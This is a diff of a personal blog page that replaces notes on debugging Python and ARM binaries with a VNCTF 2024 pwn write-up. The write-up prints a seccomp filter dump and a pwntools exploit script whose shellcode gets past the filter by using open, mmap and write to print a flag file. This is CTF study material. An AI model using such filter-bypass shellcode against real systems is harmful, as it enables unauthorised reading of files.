@@ -20,20 +20,20 @@
     var CONFIG = {"hostname":"heygap.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="总结一下异架构的相关内容，便于后续调用">
+  <meta name="description" content="没注意到今天还有一个 vnctf😭赛后复盘一下">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwn - Architecture other than LinuxC">
-<meta property="og:url" content="http://heygap.github.io/2024/02/09/Pwn%20-%20Architecture%20other%20than%20LinuxC/index.html">
+<meta property="og:title" content="comp - 2024VNCTF_pwn_wp">
+<meta property="og:url" content="http://heygap.github.io/2024/02/17/comp%20-%202024VNCTF_pwn_wp/index.html">
 <meta property="og:site_name" content="HeyGap&#39;s_Blog">
-<meta property="og:description" content="总结一下异架构的相关内容，便于后续调用">
+<meta property="og:description" content="没注意到今天还有一个 vnctf😭赛后复盘一下">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-02-09T09:47:00.000Z">
-<meta property="article:modified_time" content="2024-02-14T12:26:22.290Z">
+<meta property="article:published_time" content="2024-02-17T15:15:00.000Z">
+<meta property="article:modified_time" content="2024-02-17T15:31:47.788Z">
 <meta property="article:author" content="HeyGap">
-<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="WriteUp">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://heygap.github.io/2024/02/09/Pwn%20-%20Architecture%20other%20than%20LinuxC/">
+<link rel="canonical" href="http://heygap.github.io/2024/02/17/comp%20-%202024VNCTF_pwn_wp/">
 
 
 <script id="page-configurations">
@@ -46,7 +46,7 @@
   };
 </script>
 
-  <title>Pwn - Architecture other than LinuxC | HeyGap's_Blog</title>
+  <title>comp - 2024VNCTF_pwn_wp | HeyGap's_Blog</title>
   
 
 
@@ -188,7 +188,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://heygap.github.io/2024/02/09/Pwn%20-%20Architecture%20other%20than%20LinuxC/">
+    <link itemprop="mainEntityOfPage" href="http://heygap.github.io/2024/02/17/comp%20-%202024VNCTF_pwn_wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -201,7 +201,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Pwn - Architecture other than LinuxC
+          comp - 2024VNCTF_pwn_wp
         </h1>
 
         <div class="post-meta">
@@ -210,23 +210,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2024-02-09 17:02:00" itemprop="dateCreated datePublished" datetime="2024-02-09T17:47:00+08:00">2024-02-09</time>
+              <time title="创建时间：2024-02-17 23:02:00 / 修改时间：23:02:78" itemprop="dateCreated datePublished" datetime="2024-02-17T23:15:00+08:00">2024-02-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-02-14 20:02:29" itemprop="dateModified" datetime="2024-02-14T20:26:22+08:00">2024-02-14</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF-Theory/" itemprop="url" rel="index"><span itemprop="name">CTF_Theory</span></a>
+                  <a href="/categories/competition/" itemprop="url" rel="index"><span itemprop="name">competition</span></a>
                 </span>
             </span>
 
@@ -249,27 +243,21 @@
 
       
         <blockquote class="blockquote-center">
-总结一下异架构的相关内容，便于后续调用
+没注意到今天还有一个 vnctf😭赛后复盘一下
 </blockquote>
 
 <span id="more"></span>
-<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ol>
-<li><p><a href="#1-different-language">Different Language</a></p>
-<ul>
-<li><a href="#1-1-python">python</a></li>
-</ul>
-</li>
-<li><p><a href="#2-different-architecture">Different Architecture</a></p>
-<ul>
-<li><a href="#2-1-arm">ARM</a></li>
-</ul>
-</li>
-</ol>
-<h1 id="1-Different-Language"><a href="#1-Different-Language" class="headerlink" title="[1] Different Language"></a>[1] Different Language</h1><h2 id="1-1-python"><a href="#1-1-python" class="headerlink" title="[1-1] python"></a>[1-1] python</h2><h3 id="1-1-1-python-链接-动态链接库"><a href="#1-1-1-python-链接-动态链接库" class="headerlink" title="[1-1-1] python 链接 动态链接库"></a>[1-1-1] python 链接 动态链接库</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 main.py 中添加:</span></span><br><span class="line">sys.path.append(<span class="string">&quot;/absolute/path/to/packagename.cpython-37m-x86_64-linux-gnu.so&quot;</span>)</span><br><span class="line"><span class="comment"># app.cpython-37m-x86_64-linux-gnu.so 中的 37m 指的是 python3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packagename</span><br></pre></td></tr></table></figure>
-<h3 id="1-1-2-用-pwntools-调试"><a href="#1-1-2-用-pwntools-调试" class="headerlink" title="[1-1-2] 用 pwntools 调试"></a>[1-1-2] 用 pwntools 调试</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;main.py&#x27;</span>])</span><br></pre></td></tr></table></figure>
-<h1 id="2-Different-Architecture"><a href="#2-Different-Architecture" class="headerlink" title="[2] Different Architecture"></a>[2] Different Architecture</h1><h2 id="2-1-ARM"><a href="#2-1-ARM" class="headerlink" title="[2-1] ARM"></a>[2-1] ARM</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yidianhan/p/13060466.html">Manual: ARM/mips系统调用号</a></p>
-<h3 id="2-1-1-用-pwntools-调试"><a href="#2-1-1-用-pwntools-调试" class="headerlink" title="[2-1-1] 用 pwntools 调试"></a>[2-1-1] 用 pwntools 调试</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后再开一个tmux</span></span><br><span class="line"><span class="comment"># 用 gdb-multiarch ./pwn</span></span><br><span class="line"><span class="comment"># 在 gdb 中输入 target remote:1234</span></span><br></pre></td></tr></table></figure>
-
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>签到题，禁用了 execve 相关函数，还禁用了所有与 read 和 socket send 相关的函数，也就是 ORW 缺 R</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x11 0xc000003e  if (A != ARCH_X86_64) goto 0019</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0e 0xffffffff  if (A != 0xffffffff) goto 0019</span><br><span class="line"> 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019</span><br><span class="line"> 0006: 0x15 0x0c 0x00 0x00000011  if (A == pread64) goto 0019</span><br><span class="line"> 0007: 0x15 0x0b 0x00 0x00000013  if (A == readv) goto 0019</span><br><span class="line"> 0008: 0x15 0x0a 0x00 0x00000028  if (A == sendfile) goto 0019</span><br><span class="line"> 0009: 0x15 0x09 0x00 0x0000002c  if (A == sendto) goto 0019</span><br><span class="line"> 0010: 0x15 0x08 0x00 0x0000002e  if (A == sendmsg) goto 0019</span><br><span class="line"> 0011: 0x15 0x07 0x00 0x0000003b  if (A == execve) goto 0019</span><br><span class="line"> 0012: 0x15 0x06 0x00 0x00000127  if (A == preadv) goto 0019</span><br><span class="line"> 0013: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0019</span><br><span class="line"> 0014: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0019</span><br><span class="line"> 0015: 0x15 0x03 0x00 0x000001a9  if (A == 0x1a9) goto 0019</span><br><span class="line"> 0016: 0x15 0x02 0x00 0x000001aa  if (A == 0x1aa) goto 0019</span><br><span class="line"> 0017: 0x15 0x01 0x00 0x000001ab  if (A == 0x1ab) goto 0019</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+<p>但是这种不是<code>!=</code>的 seccomp 代表了有很多其他的可能性。</p>
+<p>我们知道 mmap 可以不通过 IO 直接将磁盘文件映射到内存空间当中，所以本题我们考虑用 open - mmap - write 的方式来打印 flag 文件</p>
+<p>但这题也卡了我一个小时，主要卡在 mmap 的 flags 上。最开始 flags = 0x22 时 mmap 即使成功分配内存也无法将文件内容映射到内存中，最后调整为 flags=0x2 才成功映射</p>
+<p>以及通过这题我还学到了 mmap 在分配内存时可以将 addr 设置为 0，这样 mmap 会自动寻找一块合适的内存，而我们知道 rax 是 mmap 的返回值，所以我们可以通过控制 rax 来获取 mmap 申请的内存地址。</p>
+<p>我这里没有远程环境，不确定这种做法是否能得到 flag</p>
+<p>况且之前的 NSSCTF Round18 还出现了本地能打通远程打不通的情况，可能是 flag 文件不跟 vuln 文件在同一个文件夹下</p>
+<p>exp 如下</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">shellcode_open  = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>)</span><br><span class="line">shellcode_mmap  = shellcraft.mmap(<span class="number">0</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">0x2</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">shellcode_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">mov dl, 0x80</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = shellcode_open</span><br><span class="line">shellcode += shellcode_mmap</span><br><span class="line">shellcode += shellcode_write</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>
     </div>
 
     
@@ -284,7 +272,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://heygap.github.io/2024/02/09/Pwn%20-%20Architecture%20other%20than%20LinuxC/" title="Pwn - Architecture other than LinuxC">http://heygap.github.io/2024/02/09/Pwn - Architecture other than LinuxC/</a>
+    <a href="http://heygap.github.io/2024/02/17/comp%20-%202024VNCTF_pwn_wp/" title="comp - 2024VNCTF_pwn_wp">http://heygap.github.io/2024/02/17/comp - 2024VNCTF_pwn_wp/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -305,7 +293,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
           </div>
 
         
@@ -314,12 +302,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2024/02/08/Pwn%20-%20Shellcode%20Summary/" rel="prev" title="Pwn - Shellcode Summary">
-      <i class="fa fa-chevron-left"></i> Pwn - Shellcode Summary
+    <a href="/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/" rel="prev" title="Pwn - IO_File and ld.so exploit summary">
+      <i class="fa fa-chevron-left"></i> Pwn - IO_File and ld.so exploit summary
     </a></div>
       <div class="post-nav-item">
-    <a href="/2024/02/14/OS%20-%20jyyos_theory/" rel="next" title="OS - jyyos_theory">
-      OS - jyyos_theory <i class="fa fa-chevron-right"></i>
+    <a href="/2024/02/17/Manual/" rel="next" title="Manual">
+      Manual <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -379,7 +367,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Different-Language"><span class="nav-number">2.</span> <span class="nav-text">[1] Different Language</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-python"><span class="nav-number">2.1.</span> <span class="nav-text">[1-1] python</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-1-python-%E9%93%BE%E6%8E%A5-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="nav-number">2.1.1.</span> <span class="nav-text">[1-1-1] python 链接 动态链接库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-2-%E7%94%A8-pwntools-%E8%B0%83%E8%AF%95"><span class="nav-number">2.1.2.</span> <span class="nav-text">[1-1-2] 用 pwntools 调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-Different-Architecture"><span class="nav-number">3.</span> <span class="nav-text">[2] Different Architecture</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-ARM"><span class="nav-number">3.1.</span> <span class="nav-text">[2-1] ARM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1-%E7%94%A8-pwntools-%E8%B0%83%E8%AF%95"><span class="nav-number">3.1.1.</span> <span class="nav-text">[2-1-1] 用 pwntools 调试</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">1.1.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.2.</span> <span class="nav-text"> </span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
